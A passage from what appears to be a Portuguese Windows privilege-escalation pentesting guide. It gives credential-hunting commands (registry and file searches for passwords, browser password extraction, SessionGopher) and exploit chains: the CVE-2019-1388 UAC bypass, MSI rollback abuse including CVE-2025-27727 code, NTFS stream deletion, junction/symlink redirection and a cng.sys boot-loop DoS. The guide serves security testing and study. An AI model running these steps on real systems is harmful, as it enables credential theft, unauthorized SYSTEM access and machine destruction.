Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credenciais na Lixeira

Verifique as entradas acessíveis da Lixeira em busca de backups e arquivos de configuração excluídos, bem como de arquivos cujos nomes mencionem explicitamente credenciais. Um backup útil `.7z`, `.zip` ou `.rar` pode ter meses e um nome comum. O Windows armazena o caminho original e a data de exclusão em um registro `$I`, e o arquivo excluído na entrada `$R` correspondente; inspecione os metadados e confirme se a identidade atual tem permissão de leitura antes de abrir um arquivo. A visibilidade depende do volume, do SID do usuário e das permissões do arquivo, portanto, uma listagem vazia não prova que não exista um backup recuperável. Trate o nome de um arquivo como candidato à análise, não como prova de que ele contém um segredo válido.

Um `.pfx` excluído e acessível também pode ser uma pista de **code-signing**. Se contiver uma chave privada acessível, ela poderá assinar um script PowerShell alterado; o [PowerShell exige um certificado de code-signing com uma chave privada](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), e as [regras de publicador do AppLocker avaliam a identidade do signatário e o escopo da regra](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). A execução entre contas exige que a identidade atual possa modificar o script exato, que uma regra efetiva aceite a assinatura resultante para o script e a conta de destino, e que uma tarefa agendada ou outro consumidor com privilégios mais altos realmente o execute. Apenas o nome de um arquivo `.pfx`, o assunto do certificado ou um script com permissão de gravação não comprova essa cadeia. Analise os metadados, as ACLs, a política e o comando agendado antes de abrir material de chave privada ou acionar a tarefa.

Analise também os bancos de dados de perfis acessíveis de clientes de mensagens, as notas e os arquivos recebidos em busca de pistas de credenciais. Uma exportação de recuperação do BitLocker pode estar armazenada como HTML ou TXT, às vezes dentro de um arquivo de backup com nome identificável. Esse material pode permitir acesso a um volume de dados criptografado separado que contenha backups mais antigos; inspecione o volume e o arquivo somente quando houver autorização para isso. Se um backup incluir `NTDS.dit`, a recuperação offline de credenciais do domínio também exige a hive `SYSTEM` correspondente, conforme descrito no [fluxo de trabalho de backups e grupos privilegiados](../active-directory-methodology/privileged-groups-and-token-privileges.md). Os nomes dos arquivos e um volume bloqueado, por si só, não comprovam a existência de uma chave de recuperação utilizável ou de um backup do domínio.

Para **recuperar senhas** salvas por vários programas, você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro do registro

**Outras possíveis chaves do registro com credenciais**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Histórico dos navegadores

Verifique se há bancos de dados onde ficam armazenadas senhas do **Chrome, Edge ou Firefox**.\
Verifique também o histórico, os favoritos e os favoritos dos navegadores; talvez algumas **senhas estejam** armazenadas lá.

No perfil **Default** convencional do Edge do usuário atual, `Login Data` fica em `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, enquanto `Local State` fica no diretório pai `User Data`. [A Microsoft documenta o local padrão do perfil](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); outro perfil ou uma política `UserDataDir` pode alterar esse local. A presença dos arquivos é apenas uma pista sobre um repositório de credenciais: confirme se os arquivos podem ser lidos, se o contexto DPAPI do usuário aplicável ou outro material de chave autorizado está disponível e se um login salvo pertence a uma conta com mais privilégios. A enumeração apenas de caminhos não precisa abrir o banco de dados nem exibir senhas descriptografadas.

Para o Firefox, [a Mozilla documenta](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) que `key4.db` e `logins.json` de um perfil são, respectivamente, os arquivos de chave e de logins criptografados. A presença deles é apenas uma pista: verifique se ambos os arquivos podem ser lidos, se há entradas salvas e se uma Primary Password protege a chave antes de concluir que as credenciais podem ser usadas. Se uma credencial recuperada pertencer a uma conta de domínio, examine separadamente os direitos efetivos de controle de grupos dessa conta e os [direitos de leitura ou descriptografia da senha LAPS](../active-directory-methodology/laps.md) do grupo; artefatos do navegador, por si só, não comprovam um caminho para obter privilégios de administrador.

Ferramentas para extrair senhas dos navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunicação** entre componentes de software escritos em linguagens diferentes. Cada componente COM é **identificado por meio de um class ID (CLSID)** e expõe funcionalidades por meio de uma ou mais interfaces, identificadas por interface IDs (IIDs).

As classes e interfaces COM são definidas no Registro, respectivamente em **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface**. Esse Registro é criado pela combinação de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro dos CLSIDs desse Registro, você encontrará a subchave **InProcServer32**, que contém um **valor padrão** apontando para uma **DLL** e um valor chamado **ThreadingModel**, que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ou Multi) ou **Neutral** (Thread Neutral).

![Histórico dos navegadores - COM DLL Overwriting: Dentro dos CLSIDs desse Registro, você encontrará a subchave InProcServer32, que contém um valor padrão apontando para uma DLL e um valor...](<../../images/image (729).png>)

Basicamente, se você puder **sobrescrever qualquer uma das DLLs** que serão executadas, poderá **escalar privilégios** caso essa DLL seja executada por outro usuário.

Para saber como os attackers usam COM Hijacking como mecanismo de persistência, confira:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Busca genérica por senhas em arquivos e no Registro**

**Buscar conteúdo em arquivos**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pesquise um arquivo com um nome específico**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pesquise o registro em busca de nomes de chaves e senhas**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Ferramentas que procuram senhas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **é um plugin do msf** que criei para **executar automaticamente todos os módulos POST do metasploit que procuram credenciais** na vítima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) procura automaticamente todos os arquivos que contêm senhas mencionados nesta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair senhas de um sistema.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura **sessões**, **nomes de usuário** e **senhas** de várias ferramentas que salvam esses dados em texto não criptografado (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Imagine que **um processo em execução como SYSTEM abra um novo processo** (`OpenProcess()`) com **acesso total**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com privilégios baixos, mas herdando todos os handles abertos do processo principal**.\
Então, se você tiver **acesso total ao processo com privilégios baixos**, poderá obter o **handle aberto para o processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para saber mais sobre **como detectar e explorar essa vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia este **outro post para uma explicação mais completa sobre como testar e abusar de outros handles abertos de processos e threads herdados com diferentes níveis de permissões (não apenas acesso total)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmentos de memória compartilhada, chamados **pipes**, permitem a comunicação entre processos e a transferência de dados.

O Windows oferece um recurso chamado **Named Pipes**, que permite que processos não relacionados compartilhem dados, inclusive por redes diferentes. Isso se assemelha a uma arquitetura cliente/servidor, com funções definidas como **servidor de named pipe** e **cliente de named pipe**.

Quando um **cliente** envia dados por um pipe, o **servidor** que configurou o pipe pode **assumir a identidade** do **cliente**, desde que tenha os direitos necessários de **SeImpersonate**. Identificar um **processo privilegiado** que se comunica por um pipe que você pode imitar oferece a oportunidade de **obter privilégios mais altos**, assumindo a identidade desse processo quando ele interagir com o pipe que você estabeleceu. Para instruções sobre como executar esse ataque, consulte os guias disponíveis [**aqui**](named-pipe-client-impersonation.md) e [**aqui**](#from-high-integrity-to-system).

A ferramenta a seguir também permite **interceptar a comunicação de um named pipe com uma ferramenta como o Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e visualizar todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

O serviço Telephony (TapiSrv), no modo servidor, expõe `\\pipe\\tapsrv` (MS-TRP). Um cliente remoto autenticado pode abusar do caminho de eventos assíncronos baseado em mailslot para transformar `ClientAttach` em uma **escrita arbitrária de 4 bytes** em qualquer arquivo existente gravável por `NETWORK SERVICE` e, em seguida, obter direitos de administrador do Telephony e carregar uma DLL arbitrária como o serviço. Fluxo completo:

- `ClientAttach` com `pszDomainUser` definido como um caminho existente gravável → o serviço o abre via `CreateFileW(..., OPEN_EXISTING)` e o usa para gravações de eventos assíncronos.
- Cada evento grava no handle o `InitContext`, controlado pelo atacante, de `Initialize`. Registre um app de linha com `LRegisterRequestRecipient` (`Req_Func 61`), acione `TRequestMakeCall` (`Req_Func 121`), obtenha os dados via `GetAsyncEvents` (`Req_Func 0`) e, em seguida, cancele o registro/desligue para repetir as gravações de forma determinística.
- Adicione seu usuário a `[TapiAdministrators]` em `C:\Windows\TAPI\tsec.ini`, reconecte-se e chame `GetUIDllName` com o caminho de uma DLL arbitrária para executar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Mais detalhes:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Diversos

### Extensões de arquivo que podem executar código no Windows

Confira a página **[https://filesec.io/](https://filesec.io/)**

### Abuso de Protocol handler / ShellExecute por renderizadores Markdown

Links Markdown clicáveis encaminhados para `ShellExecuteExW` podem acionar handlers de URI perigosos (`file:`, `ms-appinstaller:` ou qualquer esquema registrado) e executar arquivos controlados pelo atacante como o usuário atual. Consulte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoramento de linhas de comando em busca de senhas**

Ao obter um shell como usuário, pode haver tarefas agendadas ou outros processos em execução que **passem credenciais na linha de comando**. O script abaixo captura as linhas de comando dos processos a cada dois segundos e compara o estado atual com o anterior, exibindo quaisquer diferenças.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Roubo de senhas de processos

## De usuário com poucos privilégios para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se você tiver acesso à interface gráfica (via console ou RDP) e o UAC estiver habilitado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário sem privilégios.

Isso permite escalar privilégios e ignorar o UAC ao mesmo tempo, usando a mesma vulnerabilidade. Além disso, não é necessário instalar nada, e o binário usado durante o processo é assinado e fornecido pela Microsoft.

Alguns dos sistemas afetados são:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Para explorar esta vulnerabilidade, é necessário executar as seguintes etapas:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Você tem todos os arquivos e informações necessários neste repositório do GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## De Administrator Medium para High Integrity Level / UAC Bypass

Leia isto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Em seguida, **leia isto para aprender sobre UAC e UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junções de diretório de upload em um diretório raiz servido

Um aplicativo pode criar um subdiretório de upload previsível, gravar nele um nome de arquivo fornecido pelo usuário e, em seguida, processar o arquivo. Se um usuário com poucos privilégios puder remover e substituir esse subdiretório por uma junção NTFS antes da gravação feita pelo servidor, a gravação poderá seguir a junção até um diretório servido pela web. Um script colocado ali pode ser executado com a identidade do serviço web, caso o servidor execute esse tipo de arquivo. Esse é um limite de gravação arbitrária específico do aplicativo; um diretório de upload gravável ou uma junção já existente, por si só, não comprovam essa possibilidade.

Verifique a construção exata do caminho e o momento em que ela ocorre no manipulador de upload, os direitos efetivos do usuário para excluir/criar o subdiretório, as ACLs efetivas do destino, se o processo de gravação segue pontos de nova análise e se o servidor web executa arquivos nesse destino. Confirme separadamente as identidades dos processos de gravação e do servidor web. Um inventário passivo pode mostrar as ACLs dos diretórios e os metadados de nova análise, mas não pode determinar o comportamento do manipulador nem uma futura troca por junção. Se a execução ocorrer com a conta de um serviço, inspecione o **token real do processo** antes de considerar qualquer caminho separado envolvendo privilégios do token.

## Da exclusão/movimentação/renomeação arbitrária de pastas à elevação de privilégios para SYSTEM

A técnica descrita [**nesta publicação do blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), com código de exploit [**disponível aqui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

O ataque consiste basicamente em abusar do recurso de rollback do Windows Installer para substituir arquivos legítimos por arquivos maliciosos durante o processo de desinstalação. Para isso, o invasor precisa criar um **instalador MSI malicioso** que será usado para sequestrar a pasta `C:\Config.Msi`, que posteriormente será usada pelo Windows Installer para armazenar arquivos de rollback durante a desinstalação de outros pacotes MSI. Os arquivos de rollback serão modificados para conter o payload malicioso.

### Injeção do caminho de limpeza do COM do Windows Installer (CVE-2025-27727)

Um cliente com poucos privilégios pode acessar o serviço `msiexec.exe` do SYSTEM por meio do objeto COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). A engenharia reversa identificou as chamadas relevantes de `IMsiServer` como `MsiBeginTransactionW` no deslocamento `0xA0` da vtable, `SetEEUIDirectoryAndFilter` em `0xC8` e `CleanupTempPackages` em `0x50`. Esses nomes e deslocamentos foram obtidos por engenharia reversa e podem variar entre builds.<sup>[[41]](#references)</sup>

Para um usuário que não seja administrador, `SetEEUIDirectoryAndFilter` representa o chamador apenas enquanto abre o caminho fornecido com `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` e `FILE_FLAG_OPEN_REPARSE_POINT`. Isso comprova que o chamador pode excluir o diretório e evita seguir um ponto de nova análise, mas **não** vincula o objeto de arquivo verificado à limpeza posterior nem comprova que o Windows Installer o criou.<sup>[[41]](#references)</sup>

Após `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` agenda o caminho como uma pasta, independentemente do argumento de filtro do chamador. O serviço grava um valor `REG_DWORD` nomeado em `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: o nome do valor é o caminho controlado pelo chamador e os dados `0x00000002` indicam o sinalizador de pasta. Em seguida, `CleanupTempPackages(NULL, FALSE)` inicia a limpeza diretamente. Seu worker elevado enumera os valores do registro e passa as entradas de pasta para `FDeleteFolder` recursivamente, sem verificar a origem do caminho. Se a remoção normal falhar, o código também chama `LockdownPath`, limpa os atributos do arquivo e tenta novamente.<sup>[[41]](#references)</sup>

A sequência mínima de chamadas recuperada de `msi.dll` é:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

A primitiva útil é a reutilização do caminho, não um redirecionamento por junction. Registre um `C:\Config.Msi` criado pelo atacante, remova-o e deixe o Windows Installer recriar o mesmo caminho com dados de rollback protegidos. A limpeza confia no nome obsoleto `TempPackages` e exclui o novo diretório como SYSTEM. Isso contorna o limite pretendido por `FILE_FLAG_OPEN_REPARSE_POINT` e pela mitigação de confiança em redirecionamentos, pois não é necessário nenhum reparse point.<sup>[[41]](#references)</sup>

Essa primitiva de exclusão se encaixa na cadeia de rollback abaixo: preserve o registro separado `Installer\Folders`, exclua o `C:\Config.Msi` protegido, recrie-o com uma NULL DACL e mantenha um handle com permissão `WRITE_DAC` aberto antes de o instalador reforçar a DACL. O handle aberto previamente pode restaurar uma DACL permissiva com `NtSetSecurityObject`; depois, o `.rbs` gerado pode ser substituído antes de o rollback continuar.<sup>[[41]](#references)</sup>

A Microsoft corrigiu o caminho impedindo que `CMsiTransaction::SetEEUIDirectoryAndFilter` chame `ScheduleFileOrFolderDelete` quando o novo feature gate está habilitado. A chamada COM ainda pode retornar sucesso, mas já não adiciona o caminho controlado pelo atacante a `TempPackages`. Aplique as atualizações de segurança do Windows de abril de 2025 em vez de usar o retorno de sucesso do método como teste da correção.<sup>[[41]](#references)[[42]](#references)</sup>

A técnica resumida é a seguinte:

1. **Stage 1 – Preparação do Hijack (`C:\Config.Msi` deve ficar vazio)**

- Step 1: Instale o MSI
    - Crie um `.msi` que instale um arquivo inofensivo (por exemplo, `dummy.txt`) em uma pasta gravável (`TARGETDIR`).
    - Marque o instalador como **"UAC Compliant"** para que um **usuário não administrador** possa executá-lo.
    - Mantenha um **handle** aberto para o arquivo após a instalação.

- Step 2: Inicie a desinstalação
    - Desinstale o mesmo `.msi`.
    - O processo de desinstalação começa a mover arquivos para `C:\Config.Msi` e renomeá-los como arquivos `.rbf` (backups de rollback).
    - **Consulte o handle de arquivo aberto** usando `GetFinalPathNameByHandle` para detectar quando o arquivo se torna `C:\Config.Msi\<random>.rbf`.

- Step 3: Sincronização personalizada
    - O `.msi` inclui uma **ação personalizada de desinstalação (`SyncOnRbfWritten`)** que:
        - Sinaliza quando o `.rbf` foi gravado.
        - Em seguida, **aguarda** outro evento antes de continuar a desinstalação.

- Step 4: Impedir a exclusão do `.rbf`
    - Quando receber o sinal, **abra o arquivo `.rbf`** sem `FILE_SHARE_DELETE` — isso **impede que ele seja excluído**.
    - Em seguida, **envie um sinal de volta** para que a desinstalação possa terminar.
    - O Windows Installer não consegue excluir o `.rbf` e, como não consegue excluir todo o conteúdo, **`C:\Config.Msi` não é removido**.

- Step 5: Excluir o `.rbf` manualmente
    - Você (atacante) exclui o arquivo `.rbf` manualmente.
    - Agora **`C:\Config.Msi` está vazio**, pronto para ser hijacked.

> Neste ponto, **acione a vulnerabilidade de exclusão arbitrária de pastas no nível SYSTEM** para excluir `C:\Config.Msi`.

2. **Stage 2 – Substituição dos scripts de rollback por scripts maliciosos**

- Step 6: Recrie `C:\Config.Msi` com ACLs fracas
    - Recrie você mesmo a pasta `C:\Config.Msi`.
    - Defina **DACLs fracas** (por exemplo, Everyone:F) e **mantenha um handle aberto** com `WRITE_DAC`.

- Step 7: Execute outra instalação
    - Instale o `.msi` novamente, com:
        - `TARGETDIR`: local gravável.
        - `ERROROUT`: uma variável que provoca uma falha forçada.
    - Essa instalação será usada para acionar o **rollback** novamente, que lê `.rbs` e `.rbf`.

- Step 8: Monitore a criação do `.rbs`
    - Use `ReadDirectoryChangesW` para monitorar `C:\Config.Msi` até surgir um novo `.rbs`.
    - Capture o nome do arquivo.

- Step 9: Sincronize antes do rollback
    - O `.msi` contém uma **ação personalizada de instalação (`SyncBeforeRollback`)** que:
        - Sinaliza um evento quando o `.rbs` é criado.
        - Em seguida, **aguarda** antes de continuar.

- Step 10: Reaplique as ACLs fracas
    - Após receber o evento de criação do `.rbs`:
        - O Windows Installer **reaplica ACLs fortes** a `C:\Config.Msi`.
        - Mas, como você ainda tem um handle com `WRITE_DAC`, pode **reaplicar as ACLs fracas**.

> As ACLs **só são aplicadas quando o handle é aberto**, então você ainda pode gravar na pasta.

- Step 11: Coloque arquivos `.rbs` e `.rbf` falsos
    - Substitua o arquivo `.rbs` por um **script de rollback falso** que instrui o Windows a:
        - Restaurar seu arquivo `.rbf` (DLL maliciosa) em um **local privilegiado** (por exemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Coloque seu `.rbf` falso, contendo uma **DLL maliciosa com payload no nível SYSTEM**.

- Step 12: Acione o rollback
    - Sinalize o evento de sincronização para que o instalador retome a execução.
    - Uma **ação personalizada do tipo 19 (`ErrorOut`)** está configurada para **falhar intencionalmente na instalação** em um ponto conhecido.
    - Isso inicia o **rollback**.

- Step 13: O SYSTEM instala sua DLL
    - O Windows Installer:
        - Lê seu `.rbs` malicioso.
        - Copia sua DLL `.rbf` para o local de destino.
    - Agora você tem sua **DLL maliciosa em um caminho carregado pelo SYSTEM**.

- Etapa final: Execute código como SYSTEM
    - Execute um **binário confiável com elevação automática** (por exemplo, `osk.exe`) que carregue a DLL hijacked.
    - **Pronto**: seu código é executado **como SYSTEM**.


### De exclusão/movimentação/renomeação arbitrária de arquivos a SYSTEM EoP

A técnica principal de rollback do MSI (a anterior) pressupõe que você pode excluir uma **pasta inteira** (por exemplo, `C:\Config.Msi`). Mas e se sua vulnerabilidade permitir apenas a **exclusão arbitrária de arquivos**?

Você poderia explorar **internos do NTFS**: toda pasta tem um alternate data stream oculto chamado:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Este fluxo armazena os **metadados de índice** da pasta.

Portanto, se você **excluir o fluxo `::$INDEX_ALLOCATION`** de uma pasta, o NTFS **removerá a pasta inteira** do sistema de arquivos.

Você pode fazer isso usando APIs padrão de exclusão de arquivos, como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mesmo chamando uma API de exclusão de *arquivo*, ela **exclui a própria pasta**.

### Da exclusão do conteúdo de uma pasta à EoP para SYSTEM
E se sua primitiva não permitir excluir arquivos/pastas arbitrários, mas **permitir excluir o *conteúdo* de uma pasta controlada por um invasor**?

1. Etapa 1: Configure uma pasta-isca e um arquivo
- Crie: `C:\temp\folder1`
- Dentro dela: `C:\temp\folder1\file1.txt`

2. Etapa 2: Coloque um **oplock** em `file1.txt`
- O oplock **pausa a execução** quando um processo privilegiado tenta excluir `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Etapa 3: Dispare um processo SYSTEM (por exemplo, `SilentCleanup`)
- Esse processo examina pastas (por exemplo, `%TEMP%`) e tenta excluir o conteúdo delas.
- Quando chega a `file1.txt`, o **oplock é acionado** e transfere o controle para o seu callback.

4. Etapa 4: Dentro do callback do oplock — redirecione a exclusão

- Opção A: Mova `file1.txt` para outro local
    - Isso esvazia `folder1` sem interromper o oplock.
    - Não exclua `file1.txt` diretamente — isso liberaria o oplock prematuramente.

- Opção B: Converta `folder1` em uma **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opção C: Crie um **symlink** em `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Isso tem como alvo o fluxo interno do NTFS que armazena os metadados da pasta — excluí-lo exclui a pasta.

5. Etapa 5: Liberar o oplock
- O processo SYSTEM continua e tenta excluir `file1.txt`.
- Mas agora, devido à junction + symlink, ele está, na verdade, excluindo:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Resultado**: `C:\Config.Msi` é excluída pelo SYSTEM.

### De criação de pasta arbitrária a DoS permanente

Explore uma primitive que permite **criar uma pasta arbitrária como SYSTEM/admin** — mesmo que **você não consiga gravar arquivos** ou **definir permissões fracas**.

Crie uma **pasta** (não um arquivo) com o nome de um **driver crítico do Windows**, por exemplo:
```
C:\Windows\System32\cng.sys
```

- Esse caminho normalmente corresponde ao driver `cng.sys` em modo kernel.
- Se você **o criar previamente como uma pasta**, o Windows não conseguirá carregar o driver real durante a inicialização.
- Então, o Windows tenta carregar `cng.sys` durante a inicialização.
- Ele encontra a pasta, **não consegue localizar o driver real** e **trava ou interrompe a inicialização**.
- **Não há fallback nem recuperação** sem intervenção externa (por exemplo, reparo de inicialização ou acesso ao disco).

### De caminhos privilegiados de log/backup + symlinks do OM a sobrescrita arbitrária de arquivos / DoS de inicialização

Quando um **serviço privilegiado** grava logs/exportações em um caminho lido de uma **configuração gravável**, redirecione esse caminho com **symlinks do Object Manager + pontos de montagem NTFS** para transformar a gravação privilegiada em uma sobrescrita arbitrária (mesmo **sem** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Requisitos**
- A configuração que armazena o caminho de destino pode ser gravada pelo invasor (por exemplo, `%ProgramData%\...\.ini`).
- Capacidade de criar um ponto de montagem para `\RPC Control` e um symlink de arquivo do OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uma operação privilegiada que grave nesse caminho (log, exportação, relatório).

**Exemplo de cadeia**
1. Leia a configuração para recuperar o destino do log privilegiado, por exemplo, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` em `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirecione o caminho sem privilégios de administrador:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Aguarde o componente privilegiado gravar o log (por exemplo, o administrador aciona "enviar SMS de teste"). A gravação agora ocorre em `C:\Windows\System32\cng.sys`.
4. Inspecione o alvo sobrescrito (com um parser hex/PE) para confirmar a corrupção; reiniciar força o Windows a carregar o caminho do driver adulterado → **boot loop DoS**. Isso também se aplica a qualquer arquivo protegido que um serviço privilegiado abra para gravação.

> `cng.sys` normalmente é carregado de `C:\Windows\System32\drivers\cng.sys`, mas, se houver uma cópia em `C:\Windows\System32\cng.sys`, ela poderá ser tentada primeiro, tornando-se um destino confiável para DoS com dados corrompidos.



## **De High Integrity a System**

### **Novo serviço**

Se você já estiver executando em um processo de High Integrity, o **caminho para SYSTEM** pode ser fácil: basta **criar e executar um novo serviço**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Ao criar um binário de serviço, certifique-se de que ele seja um serviço válido ou que execute as ações necessárias rapidamente, pois será encerrado em 20s se não for um serviço válido.

### AlwaysInstallElevated

Em um processo de High Integrity, você pode tentar **habilitar as entradas de registro AlwaysInstallElevated** e **instalar** um reverse shell usando um wrapper _**.msi**_.\
[Mais informações sobre as chaves de registro envolvidas e sobre como instalar um pacote _.msi_ aqui.](#alwaysinstallelevated)

### High + privilégio SeImpersonate para System

**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate para privilégios de Full Token

Se você tiver esses privilégios de token (provavelmente os encontrará em um processo de High Integrity), poderá **abrir quase qualquer processo** (exceto processos protegidos) com o privilégio SeDebug, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
Com essa técnica, geralmente **seleciona-se qualquer processo em execução como SYSTEM com todos os privilégios de token** (_sim, é possível encontrar processos SYSTEM sem todos os privilégios de token_).\
**Você pode encontrar um** [**exemplo de código que executa a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Essa técnica é usada pelo meterpreter para escalar privilégios em `getsystem`. Ela consiste em **criar um pipe e, em seguida, criar ou abusar de um serviço para escrever nesse pipe**. Então, o **servidor** que criou o pipe usando o privilégio **`SeImpersonate`** poderá **personificar o token** do cliente do pipe (o serviço), obtendo privilégios SYSTEM.\
